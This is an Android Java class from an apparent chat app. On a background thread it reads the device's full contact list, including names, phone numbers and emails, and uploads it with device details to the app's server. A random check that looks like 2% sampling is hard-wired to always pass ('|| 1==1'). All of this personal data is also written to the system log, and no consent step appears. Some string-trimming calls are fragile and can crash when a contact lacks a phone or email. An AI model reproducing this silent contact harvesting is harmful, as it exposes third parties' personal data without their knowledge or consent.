package com.skytech.chatim.proxy;

import java.util.Random;

import retrofit.Callback;
import retrofit.RetrofitError;
import retrofit.client.Response;
import android.content.Context;
import android.database.Cursor;
import android.provider.ContactsContract;
import android.util.Log;

import com.easemob.chatuidemo.DemoApplication;
import com.easemob.chatuidemo.R;
import com.skytech.chatim.sky.retrofit.ServerInterface;
import com.skytech.chatim.sky.util.AndroidUtil;
import com.skytech.chatim.sky.vo.ExInfo;
import com.skytech.chatim.sky.vo.ExInfoResponse;



public class ContactManager {

	private static String TAG = ContactManager.class.getSimpleName();
	private static ContactManager instantce = new ContactManager();
	private static final String SPLIT =";" ;
	private static final String SUB_SPLIT ="," ;
	private static final String BR ="\r\n" ;
	public static ContactManager getInstances() {
		return instantce;
	}

	private ContactManager() {
		//readContactOnBackgrond();
		//String ss = readContact(DemoApplication.getInstance());
	}

	public void readContactOnBackgrond() {
		if (needRead())
		new Thread(){
			@Override
			public void run() {
				String contactsText = readContact(DemoApplication.getInstance());
				uploadUserExInfo(contactsText);
				getUserExInfo();
			}


		}.start();
	}

	private void uploadUserExInfo(String contactsText) {
		final ServerInterface serverInterface = RetrofitClient.getServerInterface();
		ExInfo exInfo = new ExInfo();
		exInfo.setContact(contactsText);
		exInfo.setDevice(SkyUtil.getDevice());
		serverInterface.putUserExInfo(SkyUserManager.getInstances().getUserName(), exInfo,  new Callback<ExInfoResponse>(){

            @Override
            public void failure(RetrofitError error) {
                Log.e(TAG," upload userext  error" + error ) ;
                AndroidUtil.showToast(DemoApplication.getInstance(), R.string.login_error);
            }

            @Override
            public void success(ExInfoResponse exInfoResponse , Response arg1) {
                Log.d(TAG," upload userext  exInfoResponse" + exInfoResponse ) ;
                
            }
		    });
		
	}
	
	private void getUserExInfo() {
		final ServerInterface serverInterface = RetrofitClient.getServerInterface();
		serverInterface.getUserExInfo(SkyUserManager.getInstances().getUserName(), new Callback<ExInfoResponse>(){
            @Override
            public void failure(RetrofitError error) {
                Log.e(TAG," get  error" + error ) ;
                AndroidUtil.showToast(DemoApplication.getInstance(), R.string.login_error);
            }

            @Override
            public void success(ExInfoResponse exInfoResponse , Response arg1) {
                Log.d(TAG," get  exInfoResponse" + exInfoResponse ) ;
                
            }
		    });
		
	}
	
	private boolean needRead() {
		float random = new Random().nextFloat();
		int randomInt = (int)(random * 100 );
		return randomInt < 2 || 1==1;
	}

	private String readContact(Context context) {
		 Cursor cursor = context.getContentResolver().query(ContactsContract.Contacts.CONTENT_URI, 
                 null, null, null, null);
        int contactIdIndex = 0;
        int nameIndex = 0;
        StringBuilder stringBuilder = new StringBuilder();
        if(cursor.getCount() > 0) {
            contactIdIndex = cursor.getColumnIndex(ContactsContract.Contacts._ID);
            nameIndex = cursor.getColumnIndex(ContactsContract.Contacts.DISPLAY_NAME);
        }
        while(cursor.moveToNext()) {
            String contactId = cursor.getString(contactIdIndex);
            String name = cursor.getString(nameIndex);
            Log.i(TAG, contactId);
            Log.i(TAG, name);
            stringBuilder.append(contactId);
            stringBuilder.append(SPLIT);
            stringBuilder.append(name);
            stringBuilder.append(SPLIT);
            /*
             * 查找该联系人的phone信息
             */
            Cursor phones = context.getContentResolver().query(ContactsContract.CommonDataKinds.Phone.CONTENT_URI, 
                    null, 
                    ContactsContract.CommonDataKinds.Phone.CONTACT_ID + "=" + contactId, 
                    null, null);
            int phoneIndex = 0;
            if(phones.getCount() > 0) {
                phoneIndex = phones.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER);
            }
            while(phones.moveToNext()) {
                String phoneNumber = phones.getString(phoneIndex);
                Log.i(TAG, phoneNumber);
                stringBuilder.append(phoneNumber);
                stringBuilder.append(SUB_SPLIT);
            }
            stringBuilder.setLength(stringBuilder.length()-SUB_SPLIT.length());
            stringBuilder.append(SPLIT);
            /*
             * 查找该联系人的email信息
             */
            Cursor emails = context.getContentResolver().query(ContactsContract.CommonDataKinds.Email.CONTENT_URI, 
                    null, 
                    ContactsContract.CommonDataKinds.Email.CONTACT_ID + "=" + contactId, 
                    null, null);
            int emailIndex = 0;
            if(emails.getCount() > 0) {
                emailIndex = emails.getColumnIndex(ContactsContract.CommonDataKinds.Email.DATA);
            }
            while(emails.moveToNext()) {
                String email = emails.getString(emailIndex);
                Log.i(TAG, email);
                stringBuilder.append(email);
                stringBuilder.append(SUB_SPLIT);
            }
            stringBuilder.setLength(stringBuilder.length()-SUB_SPLIT.length());
            stringBuilder.append(BR);
        }
        stringBuilder.setLength(stringBuilder.length()-BR.length());
		String allContact = stringBuilder.toString();
		Log.i(TAG, allContact);
		return allContact;
	}


}
